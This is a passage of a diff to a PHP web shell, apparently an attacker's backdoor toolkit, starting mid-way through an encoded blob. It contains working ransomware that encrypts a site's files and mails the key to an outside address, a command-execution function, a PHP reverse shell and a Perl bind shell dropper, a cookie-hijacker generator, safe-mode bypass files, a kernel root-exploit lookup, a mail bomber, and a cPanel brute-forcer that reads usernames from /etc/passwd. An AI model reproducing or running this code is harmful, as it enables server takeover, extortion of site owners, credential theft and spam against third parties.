zAgDKoimcElpTfEohS2hj8Pz9MJK22F2SG6lsDMgqQnyrA9pJ38mgnWVreNyt1KRVlZNDynVM+onTQXtM1qiadKAGfGzIrrtfqbwmJ33L/J0AgbPtzMIPZ7Wit1USpKVnsLMOR9QLImWZFHMCky6GOeTK5VijAelUoTxp1JpiHFSKnGMP8PQDqCf9cy3p3hvZtgCm4LtE/kD2ItRBzAQzAen6r6/kWhE5QKBFbAbvs/GApZKPF6kleVqDLmC1Zc0JKNIwP3ago3CEj2W2nPb1Dm5wDc+kGQCenS6zVhqODhJ7gB3cr2D4JUk/chSQeH2enyfVNbcFgVdJkAiEYL4PcVyPNcqoyRGlZwbWM8LhAsM+jiVJ4zC5pntBPf3lQ5eOqmWztjtreW9sF6dqciO3oIsH2rZDtiBau6VFuxLdDaTuZaeCWztJrhKGz3vpaVUdRaQPvL1xGENYHXu7qzcRunaMjqF7Kj8jKypF8wbWGkbMEytsz33R7Xj8RhClITJSP5aiu7k+d1xLi6O5BV+8YjTduSvHFBrO+rPev8L")))) {
+                    echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i>  index.php (Default Page)<br>';
                 }
             }
-            deRanSomeware::plus();
         }
-        deRanSomeware::report($key);
-   }
-
-   public function report($key){
-        $message.= "=========     Ronggolawe Ransomware    =========\n";
-        $message.= "Website : ".$_SERVER['HTTP_HOST'];
-        $message.= "Key     : ".$key;
-        $message.= "========= Ronggolawe (2016) Ransomware =========\n";
-        $subject = "Report Ransomeware";
-        $headers = "From: Ransomware <ransomeware@bak.today>\r\n";
-        mail("gedzsarjuncomuniti@gmail.com",$subject,$message,$headers);
-   }
-
-   public function shcEnDesDirS($locate,$method){
-      switch ($method) {
-        case '1':
-          rename($locate, $locate.".bak");
-        break;
-        case '2':
-          $locates = str_replace(".bak", "", $locate);
-          rename($locate, $locates);
-        break;
-      }
-   }
-
-   public function shcEnCry($key,$locate){
-      $data = file_get_contents($locate);
-      $iv = mcrypt_create_iv(
-          mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC),
-          MCRYPT_DEV_URANDOM
-      );
-
-      $encrypted = base64_encode(
-          $iv .
-          mcrypt_encrypt(
-              MCRYPT_RIJNDAEL_128,
-              hash('sha256', $key, true),
-              $data,
-              MCRYPT_MODE_CBC,
-              $iv
-          )
-      );
-      if(file_put_contents($locate,  $encrypted )){
-         echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">Locked</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
-      }else{
-         echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">Locked</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> '.$locate.' <br>';
-      }
-   }
-
-   public function shcDeCry($key,$locate){
-      $data = base64_decode( file_get_contents($locate) );
-      $iv = substr($data, 0, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC));
-
-      $decrypted = rtrim(
-          mcrypt_decrypt(
-              MCRYPT_RIJNDAEL_128,
-              hash('sha256', $key, true),
-              substr($data, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC)),
-              MCRYPT_MODE_CBC,
-              $iv
-          ),
-          "\0"
-      );
-      if(file_put_contents($locate,  $decrypted )){
-         echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">Unlock</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
-      }else{
-         echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">Unlock</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
-      }
-   }
-
-
-
-   public function kecuali($ext,$name){
-        $re = "/({$name})/";
-        preg_match($re, $ext, $matches);
-        if($matches[1]){
-            return false;
+        public function shcpackUnstall() {
+            if(file_exists(".htabak")) {
+                if(unlink(".htaccess") && unlink("index.php")) {
+                    echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> .htaccess (Default Page)<br>';
+                    echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> index.php (Default Page)<br>';
+                }
+                rename(".htabak", ".htaccess");
+            }
         }
+        public function plus() {
+            flush();
+            ob_flush();
+        }
+        public function locate() {
+            return getcwd();
+        }
+        public function shcdirs($dir, $method, $key) {
+            switch($method) {
+                case '1':
+                    deRanSomeware::shcpackInstall();
+                    break;
+                case '2':
+                    deRanSomeware::shcpackUnstall();
+                    break;
+            }
+            foreach(scandir($dir) as $d) {
+                if($d != '.' && $d != '..') {
+                    $locate = $dir . DIRECTORY_SEPARATOR . $d;
+                    if(!is_dir($locate)) {
+                        if(deRanSomeware::kecuali($locate, "ini.php") && deRanSomeware::kecuali($locate, ".png") && deRanSomeware::kecuali($locate, ".htaccess") && deRanSomeware::kecuali($locate, "ini.php") && deRanSomeware::kecuali($locate, "index.php") && deRanSomeware::kecuali($locate, ".htabak")) {
+                            switch($method) {
+                                case '1':
+                                    deRanSomeware::shcEnCry($key, $locate);
+                                    deRanSomeware::shcEnDesDirS($locate, "1");
+                                    break;
+                                case '2':
+                                    deRanSomeware::shcDeCry($key, $locate);
+                                    deRanSomeware::shcEnDesDirS($locate, "2");
+                                    break;
+                            }
+                        }
+                    } else {
+                        deRanSomeware::shcdirs($locate, $method, $key);
+                    }
+                }
+                deRanSomeware::plus();
+            }
+        }
+        public function shcEnDesDirS($locate, $method) {
+            switch($method) {
+                case '1':
+                    rename($locate, $locate . ".bak");
+                    break;
+                case '2':
+                    $locates = str_replace(".bak", "", $locate);
+                    rename($locate, $locates);
+                    break;
+            }
+        }
+        public function shcEnCry($key, $locate) {
+            $data      = file_get_contents($locate);
+            $iv        = mcrypt_create_iv(mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC), MCRYPT_DEV_URANDOM);
+            $encrypted = base64_encode($iv . mcrypt_encrypt(MCRYPT_RIJNDAEL_128, hash('sha256', $key, true), $data, MCRYPT_MODE_CBC, $iv));
+            if(file_put_contents($locate, $encrypted)) {
+                echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">Locked</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">' . $locate . '</font> <br>';
+            } else {
+                echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">Locked</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> ' . $locate . ' <br>';
+            }
+        }
+        public function shcDeCry($key, $locate) {
+            $data      = base64_decode(file_get_contents($locate));
+            $iv        = substr($data, 0, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC));
+            $decrypted = rtrim(mcrypt_decrypt(MCRYPT_RIJNDAEL_128, hash('sha256', $key, true), substr($data, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC)), MCRYPT_MODE_CBC, $iv), "\0");
+            if(file_put_contents($locate, $decrypted)) {
+                echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">Unlock</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">' . $locate . '</font> <br>';
+            } else {
+                echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">Unlock</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> <font color="#2196F3">' . $locate . '</font> <br>';
+            }
+        }
+        public function kecuali($ext, $name) {
+            $re = "/({$name})/";
+            preg_match($re, $ext, $matches);
+            if($matches[1]) {
+                return false;
+            }
             return true;
-     }
-}
-
-if($_POST['submit']){
-switch ($_POST['method']) {
-   case '1':
-      deRanSomeware::shcdirs(deRanSomeware::locate(),"1",$_POST['key']);
-   break;
-   case '2':
-     deRanSomeware::shcdirs(deRanSomeware::locate(),"2",$_POST['key']);
-   break;
-}
-}else{
-echo "
+        }
+    }
+    if($_POST['submit']) {
+        switch($_POST['method']) {
+            case '1':
+                deRanSomeware::shcdirs(deRanSomeware::locate(), "1", $_POST['key']);
+                break;
+            case '2':
+                deRanSomeware::shcdirs(deRanSomeware::locate(), "2", $_POST['key']);
+                break;
+        }
+    } else {
+        echo "
 <form action='' method='post' style='text-align: center;'>
 <label>Key : </label>
 <input type='text' name='key' class='inpute' placeholder='KEY ENC/DEC'>
@@ -870,13 +824,13 @@ echo "
       </select>
       <input type='submit' name='submit' class='submite' value='Submit'/>
 </form>";
-}
-echo "
+    }
+    echo "
 </div>
 </body>";
 }
 function idxshell() {
-    if (!file_exists('.config')) {
+    if(!file_exists('.config')) {
         mkdir('.config', 0755);
     }
     $nama = fopen(".config/idx.php", "w");
@@ -886,7 +840,7 @@ function idxshell() {
     fclose($nama);
 }
 function adminer() {
-    if (!file_exists('.config')) {
+    if(!file_exists('.config')) {
         mkdir('.config', 0755);
     }
     $nama = fopen(".config/adminer.php", "w+");
@@ -895,7 +849,7 @@ function adminer() {
     fclose($nama);
 }
 function jembud2() {
-    if (!file_exists('.config')) {
+    if(!file_exists('.config')) {
         mkdir('.config', 0755);
     }
     $nama = fopen(".config/jembud2.php", "w+");
@@ -916,17 +870,17 @@ function filemanager_bg() {
     $path = !empty($_GET['path']) ? $_GET['path'] : getcwd();
     $dirs = array();
     $fils = array();
-    if (is_dir($path)) {
+    if(is_dir($path)) {
         chdir($path);
-        if ($handle = opendir($path)) {
-            while (($item = readdir($handle)) !== FALSE) {
-                if ($item == ".") {
+        if($handle = opendir($path)) {
+            while(($item = readdir($handle)) !== FALSE) {
+                if($item == ".") {
                     continue;
                 }
-                if ($item == "..") {
+                if($item == "..") {
                     continue;
                 }
-                if (is_dir($item)) {
+                if(is_dir($item)) {
                     array_push($dirs, $path . $sep . $item);
                 } else {
                     array_push($fils, $path . $sep . $item);
@@ -947,7 +901,7 @@ function filemanager_bg() {
     <th width='100px'>Permissions</th>
     <th width='500px'>Actions</th>
     </tr>";
-    foreach ($dirs as $dir) {
+    foreach($dirs as $dir) {
         echo "<tr><td><a href='{$self}?path={$dir}'>" . basename($dir) . "</a></td>
 <td>" . filesize_x($dir) . "</td>
 <td><a href='{$self}?path={$path}&amp;perm={$dir}'>" . file_perm($dir) . "</a></td>
@@ -955,7 +909,7 @@ function filemanager_bg() {
 <a href='{$self}?path={$path}&amp;rename={$dir}'>Rename</a>
 | <a href='{$self}?zip={$dir}'> Download </a></td></tr>";
     }
-    foreach ($fils as $fil) {
+    foreach($fils as $fil) {
         echo "<tr><td><a href='{$self}?path={$path}&amp;read={$fil}'>" . basename($fil) . "</a></td>
               <td>" . filesize_x($fil) . "</td>
               <td><a href='{$self}?path={$path}&amp;perm={$fil}'>" . file_perm($fil) . "</a></td>
@@ -970,12 +924,12 @@ function filemanager_bg() {
     echo "</tr></table></div>";
 }
 function rename_bg() {
-    if (isset($_GET['old_name']) && isset($_GET['new_name'])) {
+    if(isset($_GET['old_name']) && isset($_GET['new_name'])) {
         $o_r_path   = basename($_GET['old_name']);
         $r_path     = str_replace($o_r_path, "", $_GET['old_name']);
         $r_new_name = $r_path . $_GET['new_name'];
         echo $r_new_name;
-        if (rename($_GET['old_name'], $r_new_name) == FALSE) {
+        if(rename($_GET['old_name'], $r_new_name) == FALSE) {
             alert("Access Denied for this action!!!");
         } else {
             alert("Renamed File Succeessfully");
@@ -987,14 +941,14 @@ function edit_file() {
     chdir($path);
     $edt_file  = $_GET['edit'];
     $e_content = wordwrap(htmlspecialchars(file_get_contents($edt_file)));
-    if ($e_content) {
+    if($e_content) {
         $o_content = $e_content;
-    } else if (function_exists('fgets') && function_exists('fopen') && function_exists('feof')) {
+    } else if(function_exists('fgets') && function_exists('fopen') && function_exists('feof')) {
         $fd = fopen($edt_file, "rb");
-        if (!$fd) {
+        if(!$fd) {
             alert("Permission Denied");
         } else {
-            while (!feof($fd)) {
+            while(!feof($fd)) {
                 $o_content = wordwrap(htmlspecialchars(fgets($fd)));
             }
         }
@@ -1009,9 +963,9 @@ function edit_file() {
           <input class='input_big' name='save' type='submit' value='O' ><br><br><hr><br><br></div>";
 }
 function edit_file_bg() {
-    if (file_exists($_POST['e_file'])) {
+    if(file_exists($_POST['e_file'])) {
         $handle = fopen($_POST['e_file'], "w+");
-        if (!handle) {
+        if(!handle) {
             alert("Permission Denied");
         } else {
             fwrite($handle, $_POST['e_content_n']);
@@ -1024,7 +978,7 @@ function edit_file_bg() {
 }
 function delete_file() {
     $del_file = $_GET['del_fil'];
-    if (unlink($del_file) != FALSE) {
+    if(unlink($del_file) != FALSE) {
         alert("Deleted Successfully");
         exit;
     } else {
@@ -1034,15 +988,15 @@ function delete_file() {
 }
 function deldirs($d_dir) {
     $d_files = glob($d_dir . '*', GLOB_MARK);
-    foreach ($d_files as $d_file) {
-        if (is_dir($d_file)) {
+    foreach($d_files as $d_file) {
+        if(is_dir($d_file)) {
             deldirs($d_file);
         } else {
             unlink($d_file);
         }
     }
-    if (is_dir($d_dir)) {
-        if (rmdir($d_dir)) {
+    if(is_dir($d_dir)) {
+        if(rmdir($d_dir)) {
             alert("Deleted Directory Successfully");
         } else {
             alert("Access Denied for this Operation");
@@ -1053,14 +1007,14 @@ function code_viewer() {
     $path      = $_GET['path'];
     $r_file    = $_GET['read'];
     $r_content = wordwrap(htmlspecialchars(file_get_contents($r_file)));
-    if ($r_content) {
+    if($r_content) {
         $rr_content = $r_content;
-    } else if (function_exists('fgets') && function_exists('fopen') && function_exists('feof')) {
+    } else if(function_exists('fgets') && function_exists('fopen') && function_exists('feof')) {
         $fd = fopen($r_file, "rb");
-        if (!$fd) {
+        if(!$fd) {
             alert("Permission Denied");
         } else {
-            while (!feof($fd)) {
+            while(!feof($fd)) {
                 $rr_content = wordwrap(htmlspecialchars(fgets($fd)));
             }
         }
@@ -1078,8 +1032,8 @@ name='c_target' value=" . $_GET['path'] . $sep . "> Name :
 }
 function copy_file_bg() {
     global $sep;
-    if (function_exists(copy)) {
-        if (copy($_GET['c_file'], $_GET['c_target'] . $sep . $_GET['cn_name'])) {
+    if(function_exists(copy)) {
+        if(copy($_GET['c_file'], $_GET['c_target'] . $sep . $_GET['cn_name'])) {
             alert("Succeded");
         } else {
             alert("Access Denied");
@@ -1087,8 +1041,8 @@ function copy_file_bg() {
     }
 }
 function ch_perm_bg() {
-    if (isset($_GET['p_filex']) && isset($_GET['new_perm'])) {
-        if (chmod($_GET['p_filex'], $_GET['new_perm']) != FALSE) {
+    if(isset($_GET['p_filex']) && isset($_GET['new_perm'])) {
+        if(chmod($_GET['p_filex'], $_GET['new_perm']) != FALSE) {
             alert("Succeded. Permission Changed!!!");
         } else {
             alert("Access Denied for This Operation");
@@ -1126,7 +1080,7 @@ function mk_file_bg() {
     $c_file          = $_GET['new_f_name'];
     $c_file_contents = $_GET['n_file_content'];
     $handle          = fopen($c_file, "w");
-    if (!$handle) {
+    if(!$handle) {
         alert("Permission Denied");
     } else {
         fwrite($handle, $c_file_contents);
@@ -1137,7 +1091,7 @@ function mk_file_bg() {
 function create_dir() {
     chdir($_GET['path']);
     $new_dir = $_GET['new_dir'];
-    if (is_writable($_GET['path'])) {
+    if(is_writable($_GET['path'])) {
         mkdir($new_dir);
         alert("Direcory Created Successfully");
         exit;
@@ -1149,25 +1103,25 @@ function create_dir() {
 function cmd($cmd) {
     chdir($_GET['path']);
     $res = "";
-    if ($_GET['cmdexe']) {
+    if($_GET['cmdexe']) {
         $cmd = $_GET['cmdexe'];
     }
-    if (function_exists('shell_exec')) {
+    if(function_exists('shell_exec')) {
         $res = shell_exec($cmd);
-    } else if (function_exists('exec')) {
+    } else if(function_exists('exec')) {
         exec($cmd, $res);
         $res = join("\n", $res);
-    } else if (function_exists('system')) {
+    } else if(function_exists('system')) {
         ob_start();
         system($cmd);
         $res = ob_get_contents();
         ob_end_clean();
-    } elseif (function_exists('passthru')) {
+    } elseif(function_exists('passthru')) {
         ob_start();
         passthru($cmd);
         $res = ob_get_contents();
         ob_end_clean();
-    } else if (function_exists('proc_open')) {
+    } else if(function_exists('proc_open')) {
         $descriptorspec = array(
             0 => array(
                 "pipe",
@@ -1183,27 +1137,27 @@ function cmd($cmd) {
             )
         );
         $handle         = proc_open($cmd, $descriptorspec, $pipes);
-        if (is_resource($handle)) {
-            if (function_exists('fread') && function_exists('feof')) {
-                while (!feof($pipes[1])) {
+        if(is_resource($handle)) {
+            if(function_exists('fread') && function_exists('feof')) {
+                while(!feof($pipes[1])) {
                     $res .= fread($pipes[1], 512);
                 }
-            } else if (function_exists('fgets') && function_exists('feof')) {
-                while (!feof($pipes[1])) {
+            } else if(function_exists('fgets') && function_exists('feof')) {
+                while(!feof($pipes[1])) {
                     $res .= fgets($pipes[1], 512);
                 }
             }
         }
         pclose($handle);
-    } else if (function_exists('popen')) {
+    } else if(function_exists('popen')) {
         $handle = popen($cmd, "r");
-        if (is_resource($handle)) {
-            if (function_exists('fread') && function_exists('feof')) {
-                while (!feof($handle)) {
+        if(is_resource($handle)) {
+            if(function_exists('fread') && function_exists('feof')) {
+                while(!feof($handle)) {
                     $res .= fread($handle, 512);
                 }
-            } else if (function_exists('fgets') && function_exists('feof')) {
-                while (!feof($handle)) {
+            } else if(function_exists('fgets') && function_exists('feof')) {
+                while(!feof($handle)) {
                     $res .= fgets($handle, 512);
                 }
             }
@@ -1211,7 +1165,7 @@ function cmd($cmd) {
         pclose($handle);
     }
     $res = wordwrap(htmlspecialchars($res));
-    if ($_GET['cmdexe']) {
+    if($_GET['cmdexe']) {
         echo "<div id=result><center><font
 color=yellow><h2>root@Cvar1984:~#</h2></center><hr><pre>" . $res . "</font></pre></div>";
     }
@@ -1219,7 +1173,7 @@ color=yellow><h2>root@Cvar1984:~#</h2></center><hr><pre>" . $res . "</font></pre
 }
 function upload_file() {
     chdir($_POST['path']);
-    if (move_uploaded_file($_FILES['upload_f']['tmp_name'], $_FILES['upload_f']['name'])) {
+    if(move_uploaded_file($_FILES['upload_f']['tmp_name'], $_FILES['upload_f']['name'])) {
         alert("Uploaded File Successfully");
     } else {
         alert("Access Denied!!!");
@@ -1251,10 +1205,10 @@ function reverse_conn_bg() {
     $option = $_REQUEST['rev_option'];
     $ip     = $_GET['my_ip'];
     $port   = $_GET['my_port'];
-    if ($option == "PHP Reverse Shell") {
+    if($option == "PHP Reverse Shell") {
         echo "<div id=result><h2>RESULT<h2><hr><br>";
         function printit($string) {
-            if (!$daemon) {
+            if(!$daemon) {
                 print "$string\n";
             }
         }
@@ -1264,16 +1218,16 @@ function reverse_conn_bg() {
         $shell      = 'uname -a; w; id; /bin/sh -i';
         $daemon     = 0;
         $debug      = 0;
-        if (function_exists('pcntl_fork')) {
+        if(function_exists('pcntl_fork')) {
             $pid = pcntl_fork();
-            if ($pid == -1) {
+            if($pid == -1) {
                 printit("ERROR: Can't fork");
                 exit(1);
             }
-            if ($pid) {
+            if($pid) {
                 exit(0);
             }
-            if (posix_setsid() == -1) {
+            if(posix_setsid() == -1) {
                 printit("Error: Can't setsid()");
                 exit(1);
             }
@@ -1284,7 +1238,7 @@ function reverse_conn_bg() {
         chdir("/");
         umask(0);
         $sock = fsockopen($ip, $port, $errno, $errstr, 30);
-        if (!$sock) {
+        if(!$sock) {
             printit("$errstr ($errno)");
             exit(1);
         }
@@ -1303,7 +1257,7 @@ function reverse_conn_bg() {
             )
         );
         $process        = proc_open($shell, $descriptorspec, $pipes);
-        if (!is_resource($process)) {
+        if(!is_resource($process)) {
             printit("ERROR: Can't spawn shell");
             exit(1);
         }
@@ -1312,12 +1266,12 @@ function reverse_conn_bg() {
         stream_set_blocking($pipes[2], 0);
         stream_set_blocking($sock, 0);
         printit("<font color=yellow>Successfully opened reverse shell to $ip:$port </font>");
-        while (1) {
-            if (feof($sock)) {
+        while(1) {
+            if(feof($sock)) {
                 printit("ERROR: Shell connection terminated");
                 break;
             }
-            if (feof($pipes[1])) {
+            if(feof($pipes[1])) {
                 printit("ERROR: Shell process terminated");
                 break;
             }
@@ -1327,27 +1281,27 @@ function reverse_conn_bg() {
                 $pipes[2]
             );
             $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
-            if (in_array($sock, $read_a)) {
-                if ($debug)
+            if(in_array($sock, $read_a)) {
+                if($debug)
                     printit("SOCK READ");
                 $input = fread($sock, $chunk_size);
-                if ($debug)
+                if($debug)
                     printit("SOCK: $input");
                 fwrite($pipes[0], $input);
             }
-            if (in_array($pipes[1], $read_a)) {
-                if ($debug)
+            if(in_array($pipes[1], $read_a)) {
+                if($debug)
                     printit("STDOUT READ");
                 $input = fread($pipes[1], $chunk_size);
-                if ($debug)
+                if($debug)
                     printit("STDOUT: $input");
                 fwrite($sock, $input);
             }
-            if (in_array($pipes[2], $read_a)) {
-                if ($debug)
+            if(in_array($pipes[2], $read_a)) {
+                if($debug)
                     printit("STDERR READ");
                 $input = fread($pipes[2], $chunk_size);
-                if ($debug)
+                if($debug)
                     printit("STDERR: $input");
                 fwrite($sock, $input);
             }
@@ -1358,18 +1312,18 @@ function reverse_conn_bg() {
         fclose($pipes[2]);
         proc_close($process);
         echo "<br><br><hr><br><br></div>";
-    } else if ($option == "PERL Bind Shell") {
+    } else if($option == "PERL Bind Shell") {
         global $bind_perl, $os;
         $pbfl   = $bind_perl;
         $handlr = fopen("back.pl", "wb");
-        if ($handlr) {
+        if($handlr) {
             fwrite($handlr, gzinflate(base64_decode($bind_perl)));
         } else {
             alert("Access Denied for create new file");
         }
         fclose($handlr);
-        if (file_exists("back.pl")) {
-            if ($os == "nix") {
+        if(file_exists("back.pl")) {
+            if($os == "nix") {
                 cmd("chmod +x back.pl;perl back.pl $port");
             } else {
                 cmd("perl back.pl $port");
@@ -1380,10 +1334,10 @@ function reverse_conn_bg() {
 function cookie_jack() {
     global $cookie_highjacker;
     echo "<div id=result><center><h2>NOTICE</h2><hr/>";
-    if (function_exists('fopen') && function_exists('fwrite')) {
+    if(function_exists('fopen') && function_exists('fwrite')) {
         $cook   = gzinflate(base64_decode($cookie_highjacker));
         $han_le = fopen("404.php", "w+");
-        if ($han_le) {
+        if($han_le) {
             fwrite($han_le, $cook);
             echo "Yes... Cookie highjacker is generated<br> Name : <a style='color:yellow;' target=_blank
 href=404.php>404.php</a></font>.<br
@@ -1402,7 +1356,7 @@ function safe_mode_fuck() {
     global $s_php_ini, $s_htaccess, $s_htaccess_pl, $ini_php;
     $path = chdir($_GET['path']);
     chdir($_GET['path']);
-    switch ($_GET['safe_mode']) {
+    switch($_GET['safe_mode']) {
         case "s_php_ini":
             $s_file = $s_php_ini;
             $s_name = "php.ini";
@@ -1420,9 +1374,9 @@ function safe_mode_fuck() {
             $s_file = $ini_php;
             break;
     }
-    if (function_exists('fopen') && function_exists('fwrite')) {
+    if(function_exists('fopen') && function_exists('fwrite')) {
         $s_handle = fopen("$s_name", "w+");
-        if ($s_handle) {
+        if($s_handle) {
             fwrite($s_handle, $s_file);
             alert("Operation Succeed!!!");
         } else {
@@ -1430,6 +1384,40 @@ function safe_mode_fuck() {
         }
         fclose($s_handle);
     }
+}
+function ceklog() {
+echo "
+<style>
+hr{color:silver;}
+</style>
+<pre>";
+error_reporting(0);
+class jalanin {
+public function cuk($patch) {
+foreach(scandir($patch) as $d) {
+if($d!='.' && $d!='..') {
+$d = $patch.DIRECTORY_SEPARATOR.$d;
+if(!is_dir($d)) {
+jalanin::cek($d);
+} else {
+jalanin::cuk($d);
+} 
+}
+}
+}
+public function cek($patch){
+$exif="/exif_read_data/";
+preg_match($exif,file_get_contents(addslashes($patch)), $match);
+if($match[0]) {
+echo "<font color='yellow'>[EXECUTION FILE] ".$patch."</font><br><hr>";
+} else if(exif_read_data($patch)) {
+echo "<font color='red'>[LOGGER DETECTED] ".$patch."</font><br><hr>";
+} else {
+echo "<font color='lime'>[FILE SAFE] ".$patch."</font><br><hr>";
+}
+}
+}
+jalanin::cuk(getcwd());
 }
 function safe_mode_fuck_ui() {
     global $path;
@@ -1446,9 +1434,9 @@ function AccessDenied() {
     global $path, $forbid_dir;
     $path = $_GET['path'];
     chdir($path);
-    if (function_exists('fopen') && function_exists('fwrite')) {
+    if(function_exists('fopen') && function_exists('fwrite')) {
         $forbid = fopen(".htaccess", "wb");
-        if ($forbid) {
+        if($forbid) {
             fwrite($forbid, $forbid_dir);
             alert("Opreation Succeeded");
         } else {
@@ -1501,8 +1489,8 @@ function r00t_exploit() {
         '2.2.24' => 'ptrace',
         '2.2.' => 'rip,ptrace'
     );
-    foreach ($r00t_db as $kern => $exp) {
-        if (strstr($kernel, $kern)) {
+    foreach($r00t_db as $kern => $exp) {
+        if(strstr($kernel, $kern)) {
             return $exp;
         } else {
             $exp = '<font color="red">Not found.</font>';
@@ -1532,9 +1520,9 @@ function php_ende_bg() {
     $typ_d   = $_POST['typenc'];
     $c_ntent = $_POST['php_content'];
     $c_ntent = $c_ntent;
-    switch ($meth_d) {
+    switch($meth_d) {
         case "Encode":
-            switch ($typ_d) {
+            switch($typ_d) {
                 case "GZINFLATE":
                     $res_t = base64_encode(gzdeflate(trim(stripslashes($c_ntent . ' '), '<?php,
 ?>'), 9));
@@ -1558,7 +1546,7 @@ function php_ende_bg() {
             }
             break;
         case "Decode":
-            switch ($typ_d) {
+            switch($typ_d) {
                 case "GZINFLATE":
                     $res_t = gzinflate(base64_decode($c_ntent));
                     break;
@@ -1606,8 +1594,8 @@ function massmailer_bg() {
     $to      = $_POST['to_mail'];
     $subject = $_POST['subject_mail'];
     $message = $_POST['mail_content'];
-    if (function_exists('mail')) {
-        if (mail($to, $subject, $message, "From:$from")) {
+    if(function_exists('mail')) {
+        if(mail($to, $subject, $message, "From:$from")) {
             echo "<div id=result><center><h2>MAIL
 SPAMER</h2><hr /><br /><br /><font color=yellow
 size=4>Successfully Mails Send...</font><br><br><hr><br><br>";
@@ -1629,12 +1617,12 @@ function mailbomb_bg() {
     $subject = $_POST['bomb_subject'] . " ID " . $rand;
     $times   = $_POST['bomb_no'];
     $content = $_POST['bmail_content'];
-    if ($times == '') {
+    if($times == '') {
         $times = 1000;
     }
-    while ($times--) {
-        if (function_exists('mail')) {
-            if (mail($to, $subject, $message, "From:$from")) {
+    while($times--) {
+        if(function_exists('mail')) {
+            if(mail($to, $subject, $message, "From:$from")) {
                 echo "<div
 id=result><center><h2>MAIL SPAMING</h2><hr><br><br><font color=yellow size=4>Successfully
 Mails Bombed... :p</font><br><br><hr><br><br>";
@@ -1661,12 +1649,12 @@ function cpanel_check($host, $user, $pass, $timeout) {
     curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
     curl_setopt($ch, CURLOPT_FAILONERROR, 1);
     $data = curl_exec($ch);
-    if (curl_errno($ch) == 28) {
+    if(curl_errno($ch) == 28) {
         print "<b><font color=orange>Error :</font>
 <font color=red>Connection Timeout. Please Check The Target Hostname
 .</font></b>";
         exit;
-    } else if (curl_errno($ch) == 0) {
+    } else if(curl_errno($ch) == 0) {
         print "<b><font face=\"Iceland\"
 style=\"font-size: 9pt\"
 color=\"orange\">[~]</font></b><font
@@ -1687,7 +1675,7 @@ function cpanel_crack() {
     echo "<div id=result>";
     $cpanel_port     = "2082";
     $connect_timeout = 5;
-    if (!isset($_POST['username']) && !isset($_POST['password']) && !isset($_POST['target']) && !isset($_POST['cracktype'])) {
+    if(!isset($_POST['username']) && !isset($_POST['password']) && !isset($_POST['target']) && !isset($_POST['cracktype'])) {
 ?>
 		<center>
 		<form method=post>
@@ -1703,10 +1691,10 @@ align=center>Password</td>
 			<tr>
 				<td align=center><textarea spellcheck='false'
 class=textarea_edit name=username rows=25 cols=35 class=box><?php
-        if ($os != "win") {
-            if (@file('/etc/passwd')) {
+        if($os != "win") {
+            if(@file('/etc/passwd')) {
                 $users = file('/etc/passwd');
-                foreach ($users as $user) {
+                foreach($users as $user) {
                     $user = explode(':', $user);
                     echo $user[0] . "\n";
                 }
@@ -1714,22 +1702,22 @@ class=textarea_edit name=username rows=25 cols=35 class=box><?php
                 $temp = "";
                 $val1 = 0;
                 $val2 = 1000;
-                for (; $val1 <= $val2; $val1++) {
+                for(; $val1 <= $val2; $val1++) {
                     $uid = @posix_getpwuid($val1);
-                    if ($uid)
+                    if($uid)
                         $temp .= join(':', $uid) . "\n";
                 }
                 $temp = trim($temp);
-                if ($file5 = fopen("test.txt", "w")) {
+                if($file5 = fopen("test.txt", "w")) {
                     fputs($file5, $temp);
                     fclose($file5);
                     $file = fopen("test.txt", "r");
-                    while (!feof($file)) {
+                    while(!feof($file)) {
                         $s       = fgets($file);
                         $matches = array();
                         $t       = preg_match('/\/(.*?)\:\//s', $s, $matches);
                         $matches = str_replace("home/", "", $matches[1]);
-                        if (strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
+                        if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
                             continue;
                         echo $matches;
                     }
@@ -1766,33 +1754,33 @@ value="O" class=but></td>
 		</center>
 		<?php
     } else {
-        if (empty($_POST['username']) || empty($_POST['password']))
+        if(empty($_POST['username']) || empty($_POST['password']))
             echo "<center>Please Enter The Users or Password List</center>";
         else {
